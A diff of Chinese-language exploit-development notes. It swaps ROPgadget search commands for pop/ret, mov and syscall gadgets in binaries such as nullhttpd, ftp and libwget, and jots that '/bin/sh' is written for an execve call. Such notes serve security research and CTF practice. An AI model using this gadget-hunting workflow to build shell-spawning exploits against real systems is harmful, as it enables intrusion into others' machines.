@@ -47,10 +47,7 @@ ROPgadget --binary mpathpersist.bin --only "pop|ret" | grep "rdi"
 寻找syscall指令地址
 
 ```
-ROPgadget --binary nullhttpd.bin --only "pop|ret" | grep "rsi"
-ROPgadget --binary nullhttpd.bin --only "pop|ret" | grep "rdx"
 ROPgadget --binary nullhttpd.bin --only "mov|pop|ret" | grep "eax"
-ROPgadget --binary nullhttpd.bin | grep "syscall"
 
 -------------------
 基于1写入/bin/sh，（binsh_addr, 0, 0）
@@ -74,13 +71,14 @@ shl edx, 4 ; add eax, edx ; ret  *8 time
 ```
 
 ```
-ROPgadget --binary ftp.bin --only "pop|ret" | grep "rdi"
-ROPgadget --binary ftp.bin | grep -v "retf" | grep "ret" | grep -v "leave" | grep -v "\[rdx" | grep -v "\[edx" | grep "dx"
+ROPgadget --binary libwget.so.2.0.0.bin --only "pop|ret" | grep "rdi"
+ROPgadget --binary libwget.so.2.0.0.bin | grep -v "retf" | grep "ret" | grep -v "leave" | grep -v "\[rdx" | grep -v "\[edx" | grep "dx"
 
-ROPgadget --binary ftp.bin | grep -v "jmp" | grep "mov qword"
-ROPgadget --binary ftp.bin | grep -v "retf" | grep "ret" | grep -v "leave" | grep "mov qword"
+ROPgadget --binary libwget.so.2.0.0.bin | grep -v "jmp" | grep "mov qword"
+ROPgadget --binary libwget.so.2.0.0.bin | grep -v "retf" | grep "ret" | grep -v "leave" | grep "mov qword"
+ROPgadget --binary libwget.so.2.0.0.bin | grep -v "retf" | grep "ret" | grep -v "leave" | grep "\["
 
-ROPgadget --binary ftp.bin | grep "syscall"
+ROPgadget --binary libwget.so.2.0.0.bin | grep "syscall"
 
 ```
 ## 可控参数检查
